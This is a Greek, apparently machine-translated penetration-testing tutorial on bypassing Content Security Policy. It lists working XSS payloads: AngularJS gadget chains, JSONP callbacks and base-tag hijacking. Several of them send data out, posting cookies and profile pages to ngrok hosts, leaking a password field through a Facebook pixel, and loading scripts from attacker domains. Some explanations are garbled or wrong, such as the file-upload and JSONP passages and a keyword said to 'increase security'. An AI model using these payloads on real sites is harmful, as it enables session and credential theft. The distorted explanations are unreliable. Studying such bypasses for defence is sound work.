# Παράκαμψη της Πολιτικής Ασφάλειας Περιεχομένου (CSP)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Συμμετάσχετε στον διακομιστή [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Χάκινγκ**\
Ασχοληθείτε με περιεχόμενο που εξερευνά τον ενθουσιασμό και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενημερωμένοι με τις νεότερες ευρήματα ασφαλείας που ξεκινούν και τις κρίσιμες ενημερώσεις των πλατφορμών

**Συμμετέχετε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **και αρχίστε να συνεργάζεστε με τους κορυφαίους χάκερ σήμερα!**

## Τι είναι η CSP

Η Πολιτική Ασφάλειας Περιεχομένου (CSP) αναγνωρίζεται ως μια τεχνολογία προγράμματος περιήγησης, κυρίως με στόχο την **προστασία από επιθέσεις όπως η διασταύρωση τοποθεσιών (XSS)**. Λειτουργεί καθορίζοντας και αναλύοντας διαδρομές και πηγές από τις οποίες το πρόγραμμα περιήγησης μπορεί να φορτώσει ασφαλώς πόρους. Αυτοί οι πόροι περιλαμβάνουν μια σειρά στοιχείων, όπως εικόνες, πλαίσια και JavaScript. Για παράδειγμα, μια πολιτική μπορεί να επιτρέπει τη φόρτωση και εκτέλεση πόρων από τον ίδιο τομέα (self), συμπεριλαμβανομένων των ενσωματωμένων πόρων και της εκτέλεσης κώδικα συμβολοσειράς μέσω λειτουργιών όπως `eval`, `setTimeout` ή `setInterval`.

Η εφαρμογή της CSP πραγματοποιείται μέσω **κεφαλίδων απόκρισης** ή με την ενσωμάτωση **στοιχείων meta στη σελίδα HTML**. Μετά την εφαρμογή αυτής της πολιτικής, τα προγράμματα περιήγησης επιβάλλουν προληπτικά αυτές τις προϋποθέσεις και αποκλείουν αμέσως οποιεσδήποτε παραβιάσεις εντοπίζονται. 

- Εφαρμογή μέσω κεφαλίδας απόκρισης:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Υλοποιείται μέσω της ετικέτας meta:

```html
<meta http-equiv="Content-Security-Policy" content="...">
```

Αυτή η μέθοδος εφαρμόζει την πολιτική ασφαλείας του περιεχομένου (Content Security Policy - CSP) μέσω της ετικέτας meta στον κώδικα HTML της ιστοσελίδας. Η πολιτική ασφαλείας καθορίζει ποιος τύπος περιεχομένου επιτρέπεται να φορτωθεί στην ιστοσελίδα και αποτρέπει την εκτέλεση κακόβουλου κώδικα.

Για να παρακάμψετε την πολιτική ασφαλείας του περιεχομένου, μπορείτε να χρησιμοποιήσετε διάφορες τεχνικές, όπως:

- Εκμετάλλευση ευπάθειας στην πολιτική ασφαλείας του περιεχομένου
- Χρήση επιτρεπόμενων πηγών για να φορτώσετε κακόβουλο κώδικα
- Αποστολή αιτήσεων από άλλες πηγές με τη χρήση του CSP bypass

Είναι σημαντικό να λαμβάνετε υπόψη την πολιτική ασφαλείας του περιεχομένου κατά την ανάπτυξη και την αξιολόγηση της ασφάλειας μιας ιστοσελίδας.
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Κεφαλίδες

Το CSP μπορεί να επιβληθεί ή να παρακολουθηθεί χρησιμοποιώντας αυτές τις κεφαλίδες:

* `Content-Security-Policy`: Επιβάλλει το CSP· ο περιηγητής αποκλείει οποιεσδήποτε παραβιάσεις.
* `Content-Security-Policy-Report-Only`: Χρησιμοποιείται για παρακολούθηση· αναφέρει παραβιάσεις χωρίς να τις αποκλείει. Ιδανικό για δοκιμές σε περιβάλλοντα προ-παραγωγής.

### Ορισμός Πόρων

Το CSP περιορίζει τις προελεύσεις για τη φόρτωση τόσο ενεργού όσο και απευθείας περιεχομένου, ελέγχοντας πτυχές όπως η εκτέλεση inline JavaScript και η χρήση της `eval()`. Ένα παράδειγμα πολιτικής είναι:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Οδηγίες

* **script-src**: Επιτρέπει συγκεκριμένες πηγές για το JavaScript, συμπεριλαμβανομένων των URL, των ενσωματωμένων σεναρίων και των σεναρίων που ενεργοποιούνται από χειριστές γεγονότων ή φύλλα στυλ XSLT.
* **default-src**: Ορίζει μια προεπιλεγμένη πολιτική για τη λήψη πόρων όταν λείπουν συγκεκριμένες οδηγίες λήψης.
* **child-src**: Καθορίζει τους επιτρεπόμενους πόρους για τους ενσωματωμένους πόρους εργαζομένων ιστού και πλαισίων.
* **connect-src**: Περιορίζει τα URL που μπορούν να φορτωθούν χρησιμοποιώντας διεπαφές όπως fetch, WebSocket, XMLHttpRequest.
* **frame-src**: Περιορίζει τα URL για τα πλαίσια.
* **frame-ancestors**: Καθορίζει ποιες πηγές μπορούν να ενσωματώσουν την τρέχουσα σελίδα, εφαρμόσιμη σε στοιχεία όπως `<frame>`, `<iframe>`, `<object>`, `<embed>` και `<applet>`.
* **img-src**: Ορίζει τις επιτρεπόμενες πηγές για εικόνες.
* **font-src**: Καθορίζει έγκυρες πηγές για γραμματοσειρές που φορτώνονται χρησιμοποιώντας `@font-face`.
* **manifest-src**: Ορίζει τις επιτρεπόμενες πηγές των αρχείων μεταφόρτωσης εφαρμογής.
* **media-src**: Ορίζει τις επιτρεπόμενες πηγές για τη φόρτωση αντικειμένων πολυμέσων.
* **object-src**: Ορίζει τις επιτρεπόμενες πηγές για τα στοιχεία `<object>`, `<embed>` και `<applet>`.
* **base-uri**: Καθορίζει τα επιτρεπόμενα URL για φόρτωση χρησιμοποιώντας στοιχεία `<base>`.
* **form-action**: Καταγράφει έγκυρα σημεία προορισμού για υποβολές φορμών.
* **plugin-types**: Περιορίζει τους τύπους mime που μια σελίδα μπορεί να εκτελέσει.
* **upgrade-insecure-requests**: Οδηγεί τους περιηγητές να ανακατευθύνουν τα URL HTTP σε HTTPS.
* **sandbox**: Εφαρμόζει περιορισμούς παρόμοιους με το χαρακτηριστικό sandbox ενός `<iframe>`.
* **report-to**: Καθορίζει μια ομάδα στην οποία θα αποσταλεί ένα αναφορά αν παραβιαστεί η πολιτική.
* **worker-src**: Καθορίζει έγκυρες πηγές για σενάρια Worker, SharedWorker ή ServiceWorker.
* **prefetch-src**: Καθορίζει έγκυρες πηγές για πόρους που θα ανακτηθούν ή προ-ανακτηθούν.
* **navigate-to**: Περιορίζει τα URL στα οποία μπορεί να πλοηγηθεί ένα έγγραφο με οποιονδήποτε τρόπο (a, form, window.location, window.open, κλπ.)


### Πηγές

* `*`: Επιτρέπει όλα τα URL εκτός από αυτά με τις σχήματα `data:`, `blob:`, `filesystem:`.
* `'self'`: Επιτρέπει τη φόρτωση από τον ίδιο τομέα.
* `'data'`: Επιτρέπει τη φόρτωση πόρων μέσω του σχήματος δεδομένων (π.χ. εικόνες κωδικοποιημένες με Base64).
* `'none'`: Αποκλείει τη φόρτωση από οποιαδήποτε πηγή.
* `'unsafe-eval'`: Επιτρέπει τη χρήση της μεθόδου `eval()` και παρόμοιων μεθόδων, δεν συνιστάται για λόγους ασφαλείας.
* `'unsafe-hashes'`: Ενεργοποιεί συγκεκριμένους ενσωματωμένους χειριστές γεγονότων.
* `'unsafe-inline'`: Επιτρέπει τη χρήση ενσωματωμένων πόρων όπως ενσωματωμένα `<script>` ή `<style>`, δεν συνιστάται για λόγους ασφαλείας.
* `'nonce'`: Μια λευκή λίστα για συγκεκριμένα ενσωματωμένα σενάρια χρησιμοποιώντας έναν κρυπτογραφικό nonce (αριθμός που χρησιμοποιείται μόνο μία φορά).
* `'sha256-<hash>'`: Λευκοί κατάλογοι σεναρίων με συγκεκριμένο κατακερματισμό sha256.
* `'strict-dynamic'`: Επιτρέπει τη φόρτωση σεναρίων από οποιαδήποτε πηγή αν έχει εγκριθεί από έναν κρυπτογραφικό nonce ή κατακερματισμό.
* `'host'`: Καθορίζει ένα συγκεκριμένο κεντρικό υπολογιστή, όπως `example.com`.
* `https:`: Περιορίζει τα URL σε αυτά που χρησιμοποιούν HTTPS.
* `blob:`: Επιτρέπει τη φόρτωση πόρων από URL Blob (π.χ. URL Blob που δημιουργούνται μέσω JavaScript).
* `filesystem:`: Επιτρέπει τη φόρτωση πόρων από το σύστημα αρχείων.
* `'report-sample'`: Περιλαμβάνει ένα δείγμα του παραβατικού κώδικα στην αναφορά παραβίασης (χρήσιμο για αποσφαλμάτωση).
* `'strict-origin'`: Παρόμοιο με το 'self', αλλά εξασφαλίζει ότι το επίπεδο ασφάλειας του πρωτοκόλλου των πηγών ταιριάζει με το έγγραφο (μόνο ασφαλείς πηγές μπορούν να φορτώσουν πόρους από ασφαλείς πηγές).
* `'strict-origin-when-cross-origin'`: Αποστέλλει πλήρεις URL όταν γίνονται αιτήσεις ίδιας προέλευσης, αλλά αποστέλλει μόνο την προέλευση όταν η αίτηση είναι διασυνοριακή.
* `'unsafe-allow-redirects'`: Επιτρέπει τη φόρτωση πόρων που θα ανακατευθύνονται αμέσως σε άλλο πόρο. Δεν συνιστάται καθώς αυξάνει την ασφάλεια.
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Λειτουργικό φορτίο: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' μέσω Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Λειτουργικό φορτίο:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Εάν μπορείτε κατά κάποιον τρόπο να κάνετε έναν **επιτρεπόμενο κώδικα JS να δημιουργήσει ένα νέο ετικέτα script** στο DOM με τον κώδικα JS σας, επειδή ένας επιτρεπόμενος κώδικας δημιουργεί το νέο ετικέτα script, το **νέο ετικέτα script θα επιτραπεί να εκτελεστεί**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Λειτουργικό φορτίο:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Έλλειψη object-src και default-src

{% hint style="danger" %}
**Φαίνεται ότι αυτό δεν λειτουργεί πλέον**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Λειτουργικά φορτία:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Μεταφόρτωση Αρχείου + 'self'

Η πολιτική ασφαλείας περιεχομένου (Content Security Policy - CSP) είναι ένας μηχανισμός που χρησιμοποιείται για να περιορίσει τις πηγές από τις οποίες μπορεί να φορτωθεί περιεχόμενο σε μια ιστοσελίδα. Μια από τις οδηγίες που μπορούν να οριστούν στην πολιτική CSP είναι η οδηγία `script-src`, η οποία καθορίζει από ποιες πηγές μπορούν να φορτωθούν σενάρια στην ιστοσελίδα.

Όταν η τιμή της οδηγίας `script-src` περιλαμβάνει τη λέξη-κλειδί `'self'`, αυτό σημαίνει ότι μόνο σενάρια που προέρχονται από την ίδια πηγή με την ιστοσελίδα επιτρέπονται να φορτωθούν. Αυτό μπορεί να προκαλέσει προβλήματα όταν προσπαθείτε να μεταφορτώσετε αρχεία σε μια ιστοσελίδα, καθώς τα σενάρια που χρησιμοποιούνται για την μεταφόρτωση των αρχείων δεν θα επιτρέπονται.

Ωστόσο, υπάρχουν τεχνικές που μπορούν να χρησιμοποιηθούν για να παρακαμφθεί αυτή η περιοριστική πολιτική CSP. Μια από αυτές τις τεχνικές είναι να εκμεταλλευτείτε την ιδιότητα του `'self'` για την μεταφόρτωση αρχείων. Μπορείτε να δημιουργήσετε έναν διακομιστή που θα φιλοξενεί τα αρχεία που θέλετε να μεταφορτώσετε και να τα φορτώσετε χρησιμοποιώντας τη λέξη-κλειδί `'self'` στην οδηγία `script-src`. Έτσι, τα αρχεία θα θεωρούνται ότι προέρχονται από την ίδια πηγή με την ιστοσελίδα και θα επιτρέπεται η μεταφόρτωσή τους.
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Εάν μπορείτε να ανεβάσετε ένα αρχείο JS, μπορείτε να παρακάμψετε αυτό το CSP:

Λειτουργικό φορτίο:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
Ωστόσο, είναι πολύ πιθανό ότι ο διακομιστής επιβεβαιώνει το ανεβασμένο αρχείο και θα σας επιτρέψει μόνο να ανεβάσετε συγκεκριμένου τύπου αρχεία.

Επιπλέον, ακόμα κι αν μπορούσατε να ανεβάσετε έναν κώδικα JS μέσα σε ένα αρχείο χρησιμοποιώντας μια επέκταση που αποδέχεται ο διακομιστής (όπως: _script.png_), αυτό δεν θα ήταν αρκετό επειδή ορισμένοι διακομιστές όπως ο διακομιστής Apache επιλέγουν τον τύπο MIME του αρχείου με βάση την επέκταση και οι περιηγητές όπως ο Chrome θα απορρίψουν να εκτελέσουν κώδικα Javascript μέσα σε κάτι που θα έπρεπε να είναι μια εικόνα. "Ευτυχώς", υπάρχουν λάθη. Για παράδειγμα, από ένα CTF μάθαμε ότι ο Apache δεν γνωρίζει την επέκταση **.wave**, επομένως δεν την εξυπηρετεί με έναν τύπο MIME όπως audio/\*.

Από εδώ, αν βρείτε ένα XSS και ένα ανέβασμα αρχείου και καταφέρετε να βρείτε μια **παρερμηνευμένη επέκταση**, μπορείτε να δοκιμάσετε να ανεβάσετε ένα αρχείο με αυτήν την επέκταση και το περιεχόμενο του σεναρίου. Ή, αν ο διακομιστής ελέγχει τη σωστή μορφή του ανεβασμένου αρχείου, μπορείτε να δημιουργήσετε ένα πολύγλωττο ([ορισμένα παραδείγματα πολυγλωττικών εδώ](https://github.com/Polydet/polyglot-database)).

### Τρίτες Πλατφόρμες Τερματικού + ('unsafe-eval')

{% hint style="warning" %}
Για ορισμένα από τα παρακάτω δεδομένα εισόδου, **δεν απαιτείται καν το `unsafe-eval`**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Φορτώστε μια ευάλωτη έκδοση του Angular και εκτελέστε αυθαίρετο JS:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Πληρωμές χρησιμοποιώντας το Angular + μια βιβλιοθήκη με συναρτήσεις που επιστρέφουν το αντικείμενο `window` ([δείτε αυτήν την ανάρτηση](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
Η ανάρτηση δείχνει ότι μπορείτε να **φορτώσετε** όλες τις **βιβλιοθήκες** από το `cdn.cloudflare.com` (ή οποιοδήποτε άλλο επιτρεπόμενο αποθετήριο JS βιβλιοθηκών), να εκτελέσετε όλες τις προσθεμένες συναρτήσεις από κάθε βιβλιοθήκη και να ελέγξετε **ποιες συναρτήσεις από ποιες βιβλιοθήκες επιστρέφουν το αντικείμενο `window`**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
#### Κατάχρηση του κώδικα JS του Google reCAPTCHA

Σύμφωνα με [**αυτό το CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves), μπορείτε να καταχραστείτε το [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) μέσα σε ένα CSP για να εκτελέσετε αυθαίρετο κώδικα JS παρακάμπτοντας το CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
### Τρίτες Συνδέσεις Τελικών Σημείων + JSONP

Η προσθήκη τρίτων συνδέσεων τελικών σημείων σε μια πολιτική ασφαλείας περιεχομένου (Content Security Policy - CSP) μπορεί να οδηγήσει σε παραβίαση της πολιτικής. Μια από τις τεχνικές που μπορούν να χρησιμοποιηθούν για την παράκαμψη της CSP είναι η χρήση του JSONP (JSON with Padding).

Ο JSONP επιτρέπει την ανάκτηση δεδομένων από τρίτες συνδέσεις τελικών σημείων με τη χρήση της ετικέτας `<script>`. Αυτό επιτρέπει την παράκαμψη των περιορισμών της CSP που απαγορεύουν τη φόρτωση περιεχομένου από τρίτες πηγές.

Για να εκμεταλλευτείτε αυτήν την ευπάθεια, μπορείτε να δημιουργήσετε έναν διακομιστή που θα επιστρέφει τα δεδομένα σε μορφή JSONP. Στη συνέχεια, μπορείτε να ενσωματώσετε τον κώδικα `<script>` στην εφαρμογή σας, παρέχοντας τον δικό σας κωδικό JavaScript για την επεξεργασία των δεδομένων που επιστρέφονται.

Με αυτόν τον τρόπο, μπορείτε να παρακάμψετε την CSP και να ανακτήσετε δεδομένα από τρίτες συνδέσεις τελικών σημείων, ακόμα και αν αυτό απαγορεύεται από την πολιτική ασφαλείας.
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Σενάρια όπως αυτό, όπου το `script-src` έχει οριστεί σε `self` και ένα συγκεκριμένο τομέα που έχει προστεθεί στη λευκή λίστα, μπορούν να παρακαμφθούν χρησιμοποιώντας το JSONP. Τα σημεία JSONP επιτρέπουν ανασφαλείς μεθόδους κλήσης που επιτρέπουν σε έναν επιτιθέμενο να εκτελέσει XSS, λειτουργικό φορτίο:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **περιέχει έτοιμα JSONP endpoints για την παράκαμψη του CSP σε διάφορες ιστοσελίδες.**

Η ίδια ευπάθεια θα συμβεί εάν το **αξιόπιστο endpoint περιέχει ένα Open Redirect** επειδή εάν το αρχικό endpoint είναι αξιόπιστο, τα redirects είναι αξιόπιστα.

### Κατάχρηση από τρίτους
Όπως περιγράφεται στην [ακόλουθη ανάρτηση](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), υπάρχουν πολλοί τομείς τρίτων που ενδέχεται να επιτρέπονται κάπου στο CSP και μπορούν να καταχραστούνται για την εξαγωγή δεδομένων ή την εκτέλεση κώδικα JavaScript. Ορισμένοι από αυτούς τους τρίτους είναι:

| Οντότητα | Επιτρεπόμενος Τομέας | Δυνατότητες |
|--------|----------------|--------------|
| Facebook | www.facebook.com, *.facebook.com | Εξαγωγή |
| Hotjar | *.hotjar.com, ask.hotjar.io | Εξαγωγή |
| Jsdelivr | *.jsdelivr.com, cdn.jsdelivr.net | Εκτέλεση |
| Amazon CloudFront | *.cloudfront.net | Εξαγωγή, Εκτέλεση |
| Amazon AWS | *.amazonaws.com | Εξαγωγή, Εκτέλεση |
| Azure Websites | *.azurewebsites.net, *.azurestaticapps.net | Εξαγωγή, Εκτέλεση |
| Salesforce Heroku	| *.herokuapp.com | Εξαγωγή, Εκτέλεση |
| Google Firebase | *.firebaseapp.com | Εξαγωγή, Εκτέλεση |

Εάν βρείτε οποιονδήποτε από τους επιτρεπόμενους τομείς στο CSP του στόχου σας, υπάρχει πιθανότητα να μπορέσετε να παρακάμψετε το CSP καταχωρώντας στην υπηρεσία τρίτου μέρους και είτε να εξάγετε δεδομένα σε αυτήν την υπηρεσία είτε να εκτελέσετε κώδικα.

Για παράδειγμα, εάν βρείτε τον ακόλουθο CSP:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
ή
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
Θα πρέπει να μπορείτε να εξαγάγετε δεδομένα, όπως πάντα έχει γίνει με το [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). Σε αυτήν την περίπτωση, ακολουθείτε αυτά τα γενικά βήματα:

1. Δημιουργήστε έναν λογαριασμό Facebook Developer εδώ.
1. Δημιουργήστε μια νέα εφαρμογή "Facebook Login" και επιλέξτε "Ιστοσελίδα".
1. Πηγαίνετε στις "Ρυθμίσεις -> Βασικές" και πάρτε το "App ID" σας.
1. Στην ιστοσελίδα-στόχο από την οποία θέλετε να εξαγάγετε δεδομένα, μπορείτε να εξαγάγετε δεδομένα χρησιμοποιώντας απευθείας το Facebook SDK gadget "fbq" μέσω ενός "customEvent" και των δεδομένων πληρωμής.
1. Πηγαίνετε στο "Διαχειριστής Εκδηλώσεων" της εφαρμογής σας και επιλέξτε την εφαρμογή που δημιουργήσατε (σημείωση: ο διαχειριστής εκδηλώσεων μπορεί να βρεθεί σε μια διεύθυνση URL παρόμοια με αυτήν: https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events)
1. Επιλέξτε την καρτέλα "Δοκιμαστικές Εκδηλώσεις" για να δείτε τις εκδηλώσεις που στέλνονται από την ιστοσελίδα "σας".

Στη συνέχεια, στην πλευρά του θύματος, εκτελέστε τον παρακάτω κώδικα για να αρχικοποιήσετε το Facebook tracking pixel ώστε να δείχνει στην εφαρμογή του λογαριασμού Facebook του επιτιθέμενου με το app-id και να εκδώσετε ένα προσαρμοσμένο γεγονός όπως εξής:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
Όσον αφορά τους άλλους επτά τρίτους τομείς που καθορίζονται στον προηγούμενο πίνακα, υπάρχουν πολλοί άλλοι τρόποι με τους οποίους μπορείτε να τους καταχραστείτε. Ανατρέξτε στην προηγούμενη [ανάρτηση στο blog](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) για επιπλέον εξηγήσεις σχετικά με άλλες καταχρήσεις τρίτων.

### Παράκαμψη μέσω RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Εκτός από την προαναφερθείσα ανακατεύθυνση για την παράκαμψη περιορισμών διαδρομής, υπάρχει μια άλλη τεχνική που ονομάζεται Relative Path Overwrite (RPO) και μπορεί να χρησιμοποιηθεί σε ορισμένους διακομιστές.

Για παράδειγμα, αν η CSP επιτρέπει τη διαδρομή `https://example.com/scripts/react/`, μπορεί να παρακαμφθεί ως εξής:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Ο περιηγητής θα φορτώσει τελικά το `https://example.com/scripts/angular/angular.js`.

Αυτό λειτουργεί επειδή για τον περιηγητή, φορτώνετε ένα αρχείο με το όνομα `..%2fangular%2fangular.js` που βρίσκεται κάτω από το `https://example.com/scripts/react/`, το οποίο είναι συμβατό με το CSP.

Συνεπώς, θα το αποκωδικοποιήσει, ζητώντας αποτελεσματικά το `https://example.com/scripts/react/../angular/angular.js`, το οποίο είναι ισοδύναμο με το `https://example.com/scripts/angular/angular.js`.

Αξιοποιώντας αυτήν την ασυνέπεια στην ερμηνεία του URL μεταξύ του περιηγητή και του διακομιστή, μπορούν να παρακαμφθούν οι κανόνες διαδρομής.

Η λύση είναι να μην αντιμετωπίζετε το `%2f` ως `/` στην πλευρά του διακομιστή, εξασφαλίζοντας συνεπή ερμηνεία μεταξύ του περιηγητή και του διακομιστή για να αποφευχθεί αυτό το πρόβλημα.

Παράδειγμα Online: [ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Εκτέλεση JS σε iframes

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### Λείπει η **base-uri**

Αν η οδηγία **base-uri** λείπει, μπορείτε να την καταχραστείτε για να πραγματοποιήσετε μια [**dangling markup injection**](../dangling-markup-html-scriptless-injection/).

Επιπλέον, αν η σελίδα φορτώνει ένα script χρησιμοποιώντας μια σχετική διαδρομή (όπως `<script src="/js/app.js">`) χρησιμοποιώντας ένα **Nonce**, μπορείτε να καταχραστείτε την ετικέτα **base** για να το κάνετε να φορτώσει το script από τον δικό σας διακομιστή, επιτυγχάνοντας ένα XSS.

Αν η ευάλωτη σελίδα φορτώνεται με **httpS**, χρησιμοποιήστε ένα url httpS στην ετικέτα base.
```html
<base href="https://www.attacker.com/">
```
### Συμβάντα του AngularJS

Μια συγκεκριμένη πολιτική γνωστή ως Content Security Policy (CSP) μπορεί να περιορίζει τα συμβάντα του JavaScript. Ωστόσο, το AngularJS παρουσιάζει προσαρμοσμένα συμβάντα ως εναλλακτική λύση. Μέσα σε ένα συμβάν, το AngularJS παρέχει ένα μοναδικό αντικείμενο `$event`, το οποίο αναφέρεται στο αρχικό αντικείμενο συμβάντος του προγράμματος περιήγησης. Αυτό το αντικείμενο `$event` μπορεί να εκμεταλλευτείται για να παρακάμψει το CSP. Ειδικότερα, στο Chrome, το αντικείμενο `$event/event` διαθέτει ένα χαρακτηριστικό `path`, που περιέχει έναν πίνακα αντικειμένων που συμμετέχουν στην αλυσίδα εκτέλεσης του συμβάντος, με το αντικείμενο `window` να βρίσκεται πάντα στο τέλος. Αυτή η δομή είναι κρίσιμη για τεχνικές διαφυγής από το περιβάλλον ασφαλείας.

